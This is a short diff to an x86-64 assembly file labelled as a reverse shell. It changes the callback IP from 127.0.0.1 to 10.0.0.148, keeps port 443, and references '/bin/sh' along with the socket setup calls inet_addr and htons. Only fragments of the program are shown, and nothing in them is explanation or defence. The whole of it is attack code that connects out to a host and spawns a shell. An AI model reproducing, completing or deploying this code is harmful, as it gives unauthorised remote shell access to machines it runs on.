@@ -1,7 +1,7 @@
 ; reverse shell assembly
 
 .LC0:
-        .string "127.0.0.1" ; ipv4
+        .string "10.0.0.148" ; ipv4
 .LC1:
         .string "/bin/sh"
 main:
@@ -14,7 +14,7 @@ main:
         mov     edi, OFFSET FLAT:.LC0
         call    inet_addr
         mov     DWORD PTR [rbp-28], eax
-        mov     edi, 443
+        mov     edi, 443     ; port?
         call    htons
         mov     WORD PTR [rbp-30], ax
         mov     edx, 0
